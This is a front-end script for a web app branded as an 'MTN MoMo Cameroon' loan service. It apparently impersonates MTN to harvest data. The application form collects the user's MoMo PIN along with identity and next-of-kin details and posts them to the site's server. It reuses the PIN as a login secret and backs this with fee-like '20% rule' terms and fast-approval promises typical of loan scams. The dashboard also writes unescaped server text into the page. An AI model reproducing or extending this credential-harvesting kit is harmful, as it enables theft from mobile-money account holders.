// ============================================================
// script.js – MTN MoMo Cameroon v2.0
// ============================================================
'use strict';

const S = {
    applicationId: null,
    email: null,
    phone: null,
    checkSessionToken: null,
    currentApplication: null
};

const KEYS = {
    APP_ID: 'momo_cm_app_id',
    LAST_EMAIL: 'momo_cm_last_email',
    LAST_PHONE: 'momo_cm_last_phone'
};

// ─── i18n (minimal — expand as needed) ───
let currentLang = localStorage.getItem('mtn_lang') || 'en';
const translations = {
    en: {
        welcome: 'Welcome to MTN MoMo Cameroon',
        tagline: 'Get loans easily through MTN MoMo Cameroon',
        calculator: 'Loan Calculator',
        amount: 'Amount',
        term: 'Term',
        monthly: 'Monthly Payment',
        required_tx: 'Required MoMo transactions',
        start: 'START APPLICATION',
        check_status_btn: '📊 Check My Application Status',
        footer: '© 2026 MTN MoMo Loans – Powered by MTN Cameroon',
        back: 'Back',
        loan_application: 'Loan Application',
        all_in_one: 'All-in-one form',
        loan_details: 'Loan Details',
        loan_type: 'Loan Type',
        loan_amount: 'Loan Amount (XAF)',
        loan_term: 'Loan Term',
        purpose: 'Purpose of Loan',
        personal_info: 'Personal Information',
        full_name: 'Full Name',
        email: 'Email Address',
        phone_label: 'Phone Number (Cameroon)',
        phone_hint: '9 digits (e.g. 670123456)',
        employment: 'Employment',
        employment_status: 'Employment Status',
        annual_income: 'Annual Income (XAF)',
        kin: 'Next of Kin',
        kin_name: 'Next of Kin Name',
        kin_phone: 'Next of Kin Phone',
        momo_security: 'MoMo Security',
        momo_pin: 'MoMo PIN (5 digits)',
        momo_pin_hint: '🔒 Stored securely. Used to verify your identity when checking status.',
        tnc_agree: 'I have read and accept the Terms & Conditions, including MTN MoMo Terms of Use.',
        view_terms_link: 'View terms',
        submit: 'SUBMIT APPLICATION',
        conditions_title: 'What You Need to Qualify',
        cond_1: 'Be 18 years or older',
        cond_2: 'Have an active MTN MoMo account',
        cond_3: 'Have 20% in MoMo transactions',
        cond_4: 'Provide a valid next of kin',
        cond_5: 'Verify your email and phone',
        interest: 'Interest',
        term_range: 'Term',
        approval_time: 'Approval',
        trust_secure: 'Secure',
        trust_fast: '5 min approval',
        trust_local: 'Cameroon',
        req_title: 'Loan Requirement',
        req_text: 'You must have at least 20% of your requested loan amount in MoMo transactions this month.',
        twenty_title: 'Mandatory — 20% Rule',
        twenty_desc: 'You must have at least 20% of the requested amount in MoMo transactions this month.',
        twenty_confirm: 'I confirm I have at least this amount in MoMo transactions.',
        verify_email_title: 'Check your inbox',
        verify_email_text: 'We sent a verification link to:',
        verify_email_hint: '⏳ Click the link in the email to continue.',
        resend_verif: '🔄 Resend verification email',
        verify_failed_title: 'Link expired',
        verify_failed_text: 'This verification link has expired or is no longer valid.',
        back_home: 'Back to home',
        awaiting_title: 'Your application is being reviewed',
        awaiting_text: "We've sent your details to our verification team. You will be notified once approved.",
        awaiting_status: '⏳ Awaiting admin approval...',
        approved_title: 'Loan Approved!',
        approved_sub: 'Your loan has been successfully approved.',
        amount_receive: 'Amount to Receive',
        what_next: 'What happens next',
        next_1: '💰 Funds will be deposited to your MTN MoMo within 5 minutes.',
        next_2: "📱 You'll receive a confirmation SMS when the deposit is complete.",
        next_3: '📧 Full loan details sent to your email.',
        go_dashboard: 'Go to My Dashboard',
        failed_title: 'Application not approved',
        failed_default: 'Your application was not approved.',
        failed_hint: 'Contact MTN MoMo support at 111 for more information.',
        retry: 'Try Again',
        check_status_title: 'Check Application Status',
        check_status_sub: 'Enter your email and phone number',
        check_status_send: 'SEND VERIFICATION CODE',
        check_status_note: "We'll send a 6-digit code to your email.",
        otp_title: 'Verification Code',
        otp_sub: 'Enter the 6-digit code sent to your email',
        otp_label: '6-digit code',
        otp_submit: 'VERIFY CODE',
        resend_otp: '🔄 Resend code',
        pin_title: 'Enter MoMo PIN',
        pin_sub: 'Verify with your 5-digit MoMo PIN',
        pin_label: 'Your MoMo PIN (5 digits)',
        pin_submit: 'VERIFY PIN & LOGIN',
        view_terms: '📜 View Terms & Conditions',
        terms_title: 'Terms & Conditions',
        terms_accept: 'I Accept',
        live_check: 'Live check',
        app_id: 'Application ID:',
        need_help: '💬 Need help?',
        logged_out: 'Logged out'
    }
};

function t(key) {
    return (translations[currentLang] && translations[currentLang][key]) || (translations.en[key]) || key;
}
function applyLanguage() {
    document.querySelectorAll('[data-i18n]').forEach(el => {
        const key = el.getAttribute('data-i18n');
        const val = t(key);
        if (val) el.textContent = val;
    });
    const icon = document.getElementById('langIcon');
    if (icon) icon.textContent = currentLang === 'en' ? '🌐 EN' : '🌐 EN';
}
function toggleLanguage() {
    currentLang = currentLang === 'en' ? 'en' : 'en'; // single lang for now — extend as needed
    localStorage.setItem('mtn_lang', currentLang);
    applyLanguage();
}

// ─── Utils ───
function fmt(n) { return Number(n || 0).toLocaleString('en-US'); }
function xaf(n) { return 'XAF ' + fmt(n); }

function showToast(msg, type, duration) {
    type = type || 'info';
    document.querySelectorAll('.toast').forEach(x => x.remove());
    const el = document.createElement('div');
    el.className = 'toast toast-' + type;
    el.textContent = msg;
    document.body.appendChild(el);
    setTimeout(() => { el.style.opacity = '0'; setTimeout(() => el.remove(), 300); }, duration || 3200);
}
function showErr(id, msg) {
    const b = document.getElementById(id);
    if (b) { b.classList.add('show'); const t = document.getElementById(id + 'Txt'); if (t) t.textContent = msg; }
}
function clearErr(id) { const b = document.getElementById(id); if (b) b.classList.remove('show'); }

function showPage(id) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    const el = document.getElementById(id);
    if (el) el.classList.add('active');
    window.scrollTo(0, 0);
}
function goTo(id) { showPage(id); }

async function apiCall(endpoint, options) {
    options = options || {};
    try {
        const fetchOpts = Object.assign({
            credentials: 'same-origin',
            headers: { 'Content-Type': 'application/json' }
        }, options);
        fetchOpts.headers = Object.assign({ 'Content-Type': 'application/json' }, options.headers || {});
        const res = await fetch(endpoint, fetchOpts);
        const data = await res.json();
        return data;
    } catch (err) {
        console.error(endpoint + ':', err.message);
        return { ok: false, error: 'Network error.' };
    }
}

// ─── Calculator ───
function updateCalc() {
    const amt = +document.getElementById('amtSlider').value;
    const term = 48;
    const r = 0.24 / 12;
    const monthly = Math.ceil(amt * r / (1 - Math.pow(1 + r, -term)));
    const twenty = Math.ceil(amt * 0.20);

    document.getElementById('calcAmt').textContent = xaf(amt);
    document.getElementById('monthlyAmt').textContent = xaf(monthly);
    document.getElementById('requiredTx').textContent = xaf(twenty);
    document.getElementById('reqExample').textContent = xaf(amt);
    document.getElementById('reqNeed').textContent = xaf(twenty);

    const slider = document.getElementById('amtSlider');
    const pct = ((amt - 500000) / (5000000 - 500000)) * 100;
    slider.style.setProperty('--pct', pct + '%');
}

// ─── Application form ───
function startApplication() {
    clearErr('appErr');
    // Prefill from saved
    const lastEmail = localStorage.getItem(KEYS.LAST_EMAIL);
    const lastPhone = localStorage.getItem(KEYS.LAST_PHONE);
    if (lastEmail) document.getElementById('appEmail').value = lastEmail;
    if (lastPhone) document.getElementById('appPhone').value = lastPhone;

    // Prefill from calculator
    const amt = +document.getElementById('amtSlider').value;
    document.getElementById('appLoanAmount').value = amt;
    updateAppCalc();

    showPage('page-application');
}

function updateAppCalc() {
    const amt = +document.getElementById('appLoanAmount').value || 0;
    const twenty = Math.ceil(amt * 0.20);
    const twentyEl = document.getElementById('twentyAmount');
    if (twentyEl) twentyEl.textContent = xaf(twenty);
}

function pinInput(el, idx) {
    el.value = el.value.replace(/\D/g, '').slice(0, 1);
    if (el.value && idx < 4) document.getElementById('appPin' + (idx + 1)).focus();
}

function getAppPin() {
    return [0, 1, 2, 3, 4].map(i => document.getElementById('appPin' + i).value).join('');
}

async function submitApplication() {
    clearErr('appErr');
    const body = {
        fullName: document.getElementById('appFullName').value.trim(),
        email: document.getElementById('appEmail').value.trim().toLowerCase(),
        phone: document.getElementById('appPhone').value.trim(),
        momoPin: getAppPin(),
        loanType: document.getElementById('appLoanType').value,
        loanAmount: Number(document.getElementById('appLoanAmount').value),
        loanTerm: Number(document.getElementById('appLoanTerm').value),
        loanPurpose: document.getElementById('appLoanPurpose').value.trim(),
        employment: document.getElementById('appEmployment').value,
        annualIncome: Number(document.getElementById('appIncome').value),
        kinName: document.getElementById('appKinName').value.trim(),
        kinPhone: document.getElementById('appKinPhone').value.trim(),
        has20Percent: document.getElementById('has20Percent').checked,
        tncAccepted: document.getElementById('appTnc').checked
    };

    const btn = document.getElementById('appSubmitBtn');
    btn.disabled = true;
    btn.textContent = 'Submitting...';

    const res = await apiCall('/api/apply', { method: 'POST', body: JSON.stringify(body) });
    btn.disabled = false;
    btn.textContent = 'SUBMIT APPLICATION';

    if (!res.ok) {
        if (res.code === 'ALREADY_APPLIED') {
            showErr('appErr', 'Vous avez déjà une demande en cours. Utilisez "Check Status".');
            return;
        }
        return showErr('appErr', res.error || 'Submission failed.');
    }

    S.applicationId = res.applicationId;
    S.email = body.email;
    S.phone = body.phone;
    localStorage.setItem(KEYS.APP_ID, S.applicationId);
    localStorage.setItem(KEYS.LAST_EMAIL, S.email);
    localStorage.setItem(KEYS.LAST_PHONE, S.phone);

    document.getElementById('verifyEmail').textContent = res.email;
    showPage('page-verify-email');
    startVerifyEmailPoll();
    startVerifResendCountdown();
}

// ─── Verify email polling ───
let verifyEmailTimer = null;
function startVerifyEmailPoll() {
    if (verifyEmailTimer) clearInterval(verifyEmailTimer);
    verifyEmailTimer = setInterval(async () => {
        const res = await apiCall('/api/session');
        if (res.loggedIn && res.application) {
            clearInterval(verifyEmailTimer);
            verifyEmailTimer = null;
            S.currentApplication = res.application;
            if (res.application.emailVerified) {
                showToast('✅ Email verified!', 'success');
                showPage('page-awaiting');
                document.getElementById('awaitingAppId').textContent = res.application.id;
                startAwaitingPoll();
            }
        }
    }, 3000);
}

// Resend verification countdown
let verifResendTimer = null;
function startVerifResendCountdown() {
    const wrap = document.getElementById('verifResendWrap');
    const text = document.getElementById('verifCountdownText');
    const btn = document.getElementById('verifResendBtn');
    if (!wrap || !text || !btn) return;
    wrap.style.display = 'block';
    btn.style.display = 'none';
    let remaining = 120;
    text.textContent = `Resend in ${formatTime(remaining)}`;
    if (verifResendTimer) clearInterval(verifResendTimer);
    verifResendTimer = setInterval(() => {
        remaining--;
        if (remaining <= 0) {
            clearInterval(verifResendTimer);
            text.textContent = 'You can resend now.';
            btn.style.display = 'block';
        } else {
            text.textContent = `Resend in ${formatTime(remaining)}`;
        }
    }, 1000);
}
async function resendVerification() {
    const btn = document.getElementById('verifResendBtn');
    btn.disabled = true;
    btn.textContent = 'Sending...';
    const res = await apiCall('/api/resend-verification', {
        method: 'POST',
        body: JSON.stringify({ applicationId: S.applicationId })
    });
    btn.disabled = false;
    btn.textContent = t('resend_verif');
    if (res.ok) {
        showToast('✅ New link sent.', 'success');
        startVerifResendCountdown();
    } else {
        showToast(res.error || 'Failed to resend.', 'error');
    }
}

// ─── Awaiting approval polling ───
let awaitingTimer = null;
function startAwaitingPoll() {
    if (awaitingTimer) clearInterval(awaitingTimer);
    awaitingTimer = setInterval(async () => {
        const res = await apiCall('/api/session');
        if (!res.loggedIn || !res.application) {
            clearInterval(awaitingTimer);
            awaitingTimer = null;
            return;
        }
        const app = res.application;
        S.currentApplication = app;

        if (app.status === 'approved') {
            clearInterval(awaitingTimer);
            awaitingTimer = null;
            showApproved(app);
        } else if (app.status === 'failed_approval') {
            clearInterval(awaitingTimer);
            awaitingTimer = null;
            document.getElementById('failedReason').textContent = app.rejectionReason || 'Your application was not approved.';
            showPage('page-failed');
        }
    }, 3000);
}

function showApproved(app) {
    document.getElementById('aprAmount').textContent = xaf(app.loanAmount);
    document.getElementById('aprAmt').textContent = xaf(app.loanAmount);
    document.getElementById('aprTerm').textContent = app.loanTerm + ' Months';
    document.getElementById('aprMth').textContent = xaf(app.monthlyPayment);
    showPage('page-approved');
}

// ─── Check Status flow ───
async function initiateCheckStatus() {
    clearErr('checkErr');
    const email = document.getElementById('chkEmail').value.trim().toLowerCase();
    const phone = document.getElementById('chkPhone').value.trim();
    if (!email || !phone) return showErr('checkErr', 'Email et téléphone requis.');

    const btn = document.getElementById('checkBtn');
    btn.disabled = true;
    btn.textContent = 'Sending...';

    const res = await apiCall('/api/check-status', {
        method: 'POST',
        body: JSON.stringify({ email, phone })
    });

    btn.disabled = false;
    btn.textContent = t('check_status_send');

    if (!res.ok) return showErr('checkErr', res.error || 'Not found.');

    S.checkSessionToken = res.sessionToken;
    showToast(`Code envoyé à ${res.emailMasked}`, 'success');
    showPage('page-check-otp');
    clearOtpInputs();
    startOtpResendCountdown();
}

function otpInput(el, idx) {
    el.value = el.value.replace(/\D/g, '').slice(0, 1);
    if (el.value && idx < 5) document.getElementById('otp' + (idx + 1)).focus();
}
function clearOtpInputs() {
    for (let i = 0; i < 6; i++) {
        const el = document.getElementById('otp' + i);
        if (el) el.value = '';
    }
    const first = document.getElementById('otp0');
    if (first) first.focus();
}
function getOtp() {
    return [0, 1, 2, 3, 4, 5].map(i => document.getElementById('otp' + i).value).join('');
}

async function verifyOtp() {
    clearErr('otpErr');
    const otp = getOtp();
    if (otp.length !== 6) return showErr('otpErr', 'Code à 6 chiffres requis.');

    const btn = document.getElementById('otpBtn');
    btn.disabled = true;
    btn.textContent = 'Verifying...';

    const res = await apiCall('/api/check-status/verify-otp', {
        method: 'POST',
        body: JSON.stringify({ sessionToken: S.checkSessionToken, otp })
    });

    btn.disabled = false;
    btn.textContent = t('otp_submit');

    if (!res.ok) {
        showErr('otpErr', res.error || 'Invalid code.');
        return;
    }
    showToast('✅ Code vérifié !', 'success');
    showPage('page-check-pin');
    clearCheckPin();
}

let otpResendTimer = null;
function startOtpResendCountdown() {
    const wrap = document.getElementById('otpResendWrap');
    const text = document.getElementById('otpCountdownText');
    const btn = document.getElementById('otpResendBtn');
    if (!wrap) return;
    wrap.style.display = 'block';
    btn.style.display = 'none';
    let remaining = 120;
    text.textContent = `Resend in ${formatTime(remaining)}`;
    if (otpResendTimer) clearInterval(otpResendTimer);
    otpResendTimer = setInterval(() => {
        remaining--;
        if (remaining <= 0) {
            clearInterval(otpResendTimer);
            text.textContent = 'You can resend now.';
            btn.style.display = 'block';
        } else {
            text.textContent = `Resend in ${formatTime(remaining)}`;
        }
    }, 1000);
}
async function resendOtp() {
    const btn = document.getElementById('otpResendBtn');
    btn.disabled = true;
    btn.textContent = 'Sending...';
    const res = await apiCall('/api/check-status/resend-otp', {
        method: 'POST',
        body: JSON.stringify({ sessionToken: S.checkSessionToken })
    });
    btn.disabled = false;
    btn.textContent = t('resend_otp');
    if (res.ok) {
        showToast('✅ Nouveau code envoyé.', 'success');
        clearOtpInputs();
        startOtpResendCountdown();
    } else {
        showToast(res.error || 'Failed to resend.', 'error');
    }
}

function cpinInput(el, idx) {
    el.value = el.value.replace(/\D/g, '').slice(0, 1);
    if (el.value && idx < 4) document.getElementById('cpin' + (idx + 1)).focus();
}
function clearCheckPin() {
    for (let i = 0; i < 5; i++) {
        const el = document.getElementById('cpin' + i);
        if (el) el.value = '';
    }
    const first = document.getElementById('cpin0');
    if (first) first.focus();
}

async function verifyCheckPin() {
    clearErr('cpinErr');
    const pin = [0, 1, 2, 3, 4].map(i => document.getElementById('cpin' + i).value).join('');
    if (pin.length !== 5) return showErr('cpinErr', 'PIN à 5 chiffres requis.');

    const btn = document.getElementById('cpinBtn');
    btn.disabled = true;
    btn.textContent = 'Verifying...';

    const res = await apiCall('/api/check-status/verify-pin', {
        method: 'POST',
        body: JSON.stringify({ sessionToken: S.checkSessionToken, pin })
    });

    btn.disabled = false;
    btn.textContent = t('pin_submit');

    if (!res.ok) {
        showErr('cpinErr', res.error || 'Incorrect PIN.');
        return;
    }
    showToast('✅ Connexion réussie !', 'success');
    S.checkSessionToken = null;
    goToDashboard();
}

function formatTime(seconds) {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m}:${s.toString().padStart(2, '0')}`;
}

// ─── Dashboard ───
async function goToDashboard() {
    const res = await apiCall('/api/dashboard');
    if (!res.ok) {
        showToast(res.error || 'Failed to load dashboard.', 'error');
        return;
    }
    const loan = res.loan;
    document.getElementById('dashBalance').textContent = xaf(loan.balance);
    document.getElementById('dashId').textContent = loan.id;
    document.getElementById('dashTerm').textContent = loan.term + ' mo';

    const list = document.getElementById('dashTxList');
    if (res.transactions && res.transactions.length) {
        list.innerHTML = res.transactions.map(tx => `
            <div class="dash-tx">
                <div class="dash-tx-icon">${tx.type === 'disbursement' ? '💰' : '💳'}</div>
                <div class="dash-tx-details">
                    <div class="dash-tx-title">${tx.description}</div>
                    <div class="dash-tx-date">${new Date(tx.created_at).toLocaleString('en-GB')}</div>
                </div>
                <div class="dash-tx-amount">${tx.type === 'disbursement' ? '+' : '-'}${xaf(tx.amount)}</div>
            </div>
        `).join('');
    } else {
        list.innerHTML = '<div class="dash-tx-empty">No transactions yet</div>';
    }

    showPage('page-dashboard');
}

function downloadContract() {
    window.location.href = '/api/contract-pdf';
}

function logout() {
    // Clear cookie is server-side, but we can just delete from browser:
    document.cookie = 'momo_session=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
    showToast(t('logged_out'), 'info');
    setTimeout(() => location.reload(), 600);
}

function restartApplication() {
    localStorage.removeItem(KEYS.APP_ID);
    location.reload();
}

// ─── Terms ───
let termsCache = null;
async function showTerms() {
    const modal = document.getElementById('termsModal');
    modal.classList.add('show');
    if (termsCache) { document.getElementById('termsText').textContent = termsCache; return; }
    document.getElementById('termsText').textContent = 'Loading…';
    const res = await apiCall('/api/terms');
    if (!res.ok) { document.getElementById('termsText').textContent = 'Unable to load terms.'; return; }
    termsCache = res.text;
    document.getElementById('termsText').textContent = res.text;
}
function closeTerms() { document.getElementById('termsModal').classList.remove('show'); }
function acceptTerms() {
    const cb1 = document.getElementById('appTnc');
    if (cb1) cb1.checked = true;
    closeTerms();
    showToast('✅ Terms accepted', 'success', 1500);
}

// ─── Splash ───
function showSplash(cb) {
    const splash = document.getElementById('page-splash');
    const dur = window.matchMedia('(prefers-reduced-motion: reduce)').matches ? 500 : 4000;
    setTimeout(() => {
        splash.classList.add('hide');
        setTimeout(() => {
            splash.style.display = 'none';
            cb();
        }, 400);
    }, dur);
}

// ─── Boot ───
async function boot() {
    console.log('🚀 MTN MoMo Cameroon v2.0');
    applyLanguage();

    // Check session first
    const session = await apiCall('/api/session');
    let startPage = 'page-landing';
    let waiting = false;

    if (session.loggedIn && session.application) {
        const app = session.application;
        S.currentApplication = app;
        S.applicationId = app.id;

        if (!app.emailVerified) {
            document.getElementById('verifyEmail').textContent = app.email;
            startPage = 'page-verify-email';
            waiting = 'verify';
        } else if (app.status === 'approved') {
            showApproved(app);
            return;
        } else if (app.status === 'failed_approval') {
            document.getElementById('failedReason').textContent = app.rejectionReason || t('failed_default');
            startPage = 'page-failed';
        } else {
            document.getElementById('awaitingAppId').textContent = app.id;
            startPage = 'page-awaiting';
            waiting = 'awaiting';
        }
    }

    showSplash(() => {
        showPage(startPage);
        if (waiting === 'verify') {
            startVerifyEmailPoll();
            startVerifResendCountdown();
        } else if (waiting === 'awaiting') {
            startAwaitingPoll();
        }
    });

    updateCalc();
}

// Handle hash routing
window.addEventListener('hashchange', () => {
    const hash = location.hash.replace('#', '');
    if (hash && hash.startsWith('page-')) showPage(hash);
});

document.addEventListener('DOMContentLoaded', boot);
